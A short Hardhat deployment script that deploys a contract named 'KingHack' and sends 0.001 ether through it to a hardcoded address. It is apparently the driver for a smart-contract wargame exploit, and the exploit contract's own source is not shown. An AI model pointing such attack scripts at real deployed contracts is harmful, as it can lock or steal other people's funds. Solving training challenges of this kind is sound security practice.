const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  console.log("=== DEPLOYING ===");
  const contractFactory = await hre.ethers.getContractFactory("KingHack");
  const contract = await contractFactory.deploy();
  await contract.deployed();
  console.log("=== contract deployed to ", contract.address);

  console.log("=== HACKING ===");
  await contract.send("0x30B5461e2C878D8Db58a355cc0f0fB9C2F197c7D", {
    value: 1000000000000000,
  });
  /*
  const hackContractAddress = "0x3941D6De65a03d8a4Bb656477e1C0daCC58ebD06";
  const hackContractName = "KingHack";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(
    hackContractName,
    hackContractAddress,
    signer
  );
  */

  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
